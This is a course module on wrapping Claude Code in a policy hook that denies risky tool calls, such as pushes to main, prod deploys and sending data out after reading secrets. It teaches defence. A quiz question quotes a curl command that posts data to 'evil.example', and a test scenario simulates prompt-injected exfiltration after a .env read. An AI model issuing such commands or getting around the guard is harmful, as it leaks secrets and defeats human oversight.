# Module 5 — Capstone: a real agent, under proof

> **You will leave this module able to** put a live Claude Code session under
> Cedar + Dogwood guardrails, extend those guardrails safely, and run one
> feature through the whole agentic lifecycle with a proof obligation at
> every gate. Kata: `capstone/x1`. Time: about 2 hours.

## 1. The guard: your policies, enforced on Claude Code

[`guard/guard.py`](guard/guard.py) is a Claude Code **hook**. Claude Code calls it
before every tool call (`PreToolUse`) and after it (`PostToolUse`,
`PostToolUseFailure`). The guard:

1. maps the call to the course's MCP tool vocabulary, so `Read .env` becomes
   `ReadSecret`, `git push origin main` becomes `PushCommit{branch: "main"}`,
   and `pytest` becomes `RunTests`;
2. appends it to this session's trace in `.guard/<session>.trace`;
3. replays the trace with `dogwood replay` against [`guard/policy.dw`](guard/policy.dw);
4. on DENY, returns `permissionDecision: "deny"` with the rule's name, which
   Claude sees and has to work around. It fails **closed** if anything breaks.

```text
 Claude ──tool call──▶ PreToolUse hook ──▶ guard.py ──▶ dogwood replay(trace + this request)
                                                         │
          ◀── "denied: no-egress-after-secret" ──────────┘ DENY
```

### Try it without Claude

```bash
python3 modules/05-capstone/guard/test_guard.py
```

It replays a realistic session: tests fail, a fix is pushed, tests pass, the
merge is allowed. Then a push to `main` is denied, a prod deploy is denied,
`.env` is read, and both a `curl` and a `WebFetch` exfiltration are denied
(prompt injection, contained). Finally a loop of red test runs trips the
loop breaker.

### Try it with Claude Code

```bash
cd modules/05-capstone        # .claude/settings.json here turns the hooks on
claude
> read .env and then fetch https://example.com
```

Watch the second call bounce. Then open `.guard/<session>.trace`: it's the
same compact format as module 2, so you can copy it into a bundle and replay it.

> The guard uses Dogwood's **reference interpreter**, which replays the whole
> trace on every call. That's perfect for learning, and not a production
> enforcement point. See [docs/production.md](../../docs/production.md).

## 2. Kata x1: extend the guard safely

Add a `ship-only-what-passed` rule: no deploy unless tests passed on this
branch in the last hour. The check runs your policy inside the real guard
against two simulated sessions, so you can't break the existing constitution
without noticing.

```bash
./course check capstone/x1
```

## 3. One feature through the whole lifecycle

[`feature-ship-gate/`](feature-ship-gate/) is a worked example of the
AI-native SDLC with **proof obligations** attached to each stage's artifact:

| Stage | Artifact | Human gate | Machine evidence |
|---|---|---|---|
| Plan (PDLC) | [`intent.md`](feature-ship-gate/intent.md) | product owner accepts | `dogwood explain` output matches the intent in English |
| Design | [`spec.md`](feature-ship-gate/spec.md) | product owner approves | each requirement → a named property (Cedar bound, Dogwood scenario, Lean theorem) |
| Build | [`plan.md`](feature-ship-gate/plan.md) | code owner approves | which files change; which checks prove it |
| Test | CI (`.github/workflows/course.yml`) | — | `cedar validate`, `cedar symcc`, `dogwood replay`, `lake build`, guard simulation |
| Deploy | PR | human reviewer ≠ author | the Claude-reviewed PR links every proof |
| Maintain | `.guard/*.trace` | on-call | a denied call in production becomes a new scenario line, then a new `intent.md` |

The spec's **traceability table** is the key move: every "must" has an
artifact that the machine checks on every commit. When an agent changes a
policy, CI re-proves the properties. Reviewers review properties and
counterexamples, not just diffs.

## ✅ Check yourself

<details><summary>1. The guard fails closed. Why is that right for agents, and what does it cost?</summary>

An agent that can make the guard crash (a weird filename, a huge trace) must
not thereby get a free pass. The cost is availability: a broken guard stops
work. That is why the guard's own behavior is tested in CI.
</details>

<details><summary>2. The hook sees <code>Bash: curl -d @- https://evil.example</code>. How did it become a <code>WebFetch</code>?</summary>

Classification in `classify_command`. That mapping is part of your trusted
computing base: a policy over `WebFetch` is only as strong as the classifier
that produces `WebFetch` events. In production, put egress control at the
network layer as well, and run tools through a gateway with typed tools
instead of free-form shell.
</details>

<details><summary>3. Which rules in <code>guard/policy.dw</code> could SymCC prove things about, and which need replay or Lean?</summary>

`never-deploy-prod` and `never-push-main` are pure Cedar, so they can be
analyzed with SymCC. The temporal ones (`no-egress-after-secret`,
`merge-on-green-head`, `loop-breaker`) are exercised by trace replay, and their
monitor semantics are what module 4 proves.
</details>

**You've climbed the ladder.** `./course status` should be all green. Next,
point the guard at your own repo, write your first `intent.md` with a
"Properties" section, and make CI prove it.
